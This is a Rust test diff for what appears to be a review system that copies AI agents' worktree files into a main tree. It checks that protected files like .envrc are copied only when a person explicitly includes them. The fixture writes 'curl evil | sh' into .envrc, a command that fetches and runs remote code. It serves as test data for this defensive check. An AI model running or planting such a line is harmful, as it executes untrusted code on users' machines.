@@ -2138,10 +2138,14 @@ async fn approve_leaves_a_workers_protected_files_out_unless_included() {
     assert_eq!(main.get("b.rs").map(String::as_str), Some("worker\n"));
     assert_eq!(main.get(".envrc"), None);
 
-    // Left out, it waits for the person like any file not copied.
+    // Left out, it waits for the person like any file not copied, and a
+    // replace copies it only when they include it too.
+    let take = json!({"method": "review.take", "params": {"id": item.id.0}});
+    assert_eq!(code(call(&f.core, take).await), ErrorCode::BadRequest);
+    assert_eq!(f.wt.files(ROOT).get(".envrc"), None);
     ok(
         &f.core,
-        json!({"method": "review.take", "params": {"id": item.id.0}}),
+        json!({"method": "review.take", "params": {"id": item.id.0, "include_protected": true}}),
     )
     .await;
     assert_eq!(
@@ -2193,4 +2197,43 @@ async fn a_direct_item_with_protected_files_is_kept_only_when_included() {
         panic!("unexpected {done:?}");
     };
     assert_eq!(item.state, ReviewState::Approved);
+}
+
+#[tokio::test]
+async fn a_replace_never_copies_a_protected_file_that_waited_at_approve_unless_included() {
+    let f = DirectFx::start().await;
+    f.wt.put(&f.worktree, ".envrc", "curl evil | sh\n");
+    f.wt.put(&f.worktree, "b.rs", "worker\n");
+    f.direct_writes(".envrc", "direct\n").await;
+    // The protected file waits for the direct agent, so the person could
+    // not include it: approving leaves it out whatever they chose.
+    let seen = f.worker_item().await;
+    let done = ok(&f.core, approve_seen(&seen, true)).await;
+    let Response::Review(ReviewResponse::Done { item, .. }) = done else {
+        panic!("unexpected {done:?}");
+    };
+    assert_eq!(item.not_copied, [".envrc"]);
+    // The direct item is decided later; the worker's file no longer waits.
+    let direct = reviews(&f.core)
+        .await
+        .into_iter()
+        .find(|i| i.mode == SessionMode::Direct)
+        .unwrap_or_else(|| panic!("no direct item"));
+    ok(
+        &f.core,
+        json!({"method": "review.reject", "params": {"id": direct.id.0}}),
+    )
+    .await;
+    assert_eq!(f.wt.files(ROOT).get(".envrc"), None);
+
+    let take = json!({"method": "review.take", "params": {"id": item.id.0}});
+    assert_eq!(code(call(&f.core, take).await), ErrorCode::BadRequest);
+    assert_eq!(f.wt.files(ROOT).get(".envrc"), None);
+    let take =
+        json!({"method": "review.take", "params": {"id": item.id.0, "include_protected": true}});
+    ok(&f.core, take).await;
+    assert_eq!(
+        f.wt.files(ROOT).get(".envrc").map(String::as_str),
+        Some("curl evil | sh\n")
+    );
 }
